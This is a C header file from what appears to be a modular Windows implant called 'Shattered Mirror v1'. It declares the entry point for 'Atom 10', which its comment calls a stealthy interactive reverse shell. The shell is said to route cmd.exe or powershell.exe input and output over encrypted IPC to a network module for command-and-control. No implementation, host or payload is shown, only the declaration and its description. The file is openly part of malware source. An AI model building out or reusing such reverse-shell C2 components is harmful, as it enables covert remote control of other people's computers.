#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 10: Interactive Reverse Shell
 *
 * Implements a stealthy reverse shell by redirecting STDIN/STDOUT/STDERR
 * of a spawned cmd.exe or powershell.exe through our encrypted IPC 
 * to the Network Atom (01) for C2 communication.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_10_SHELL_H
#define SMIRROR_ATOM_10_SHELL_H

#include <windows.h>

/* Launch the reverse shell thread */
DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_10_SHELL_H */
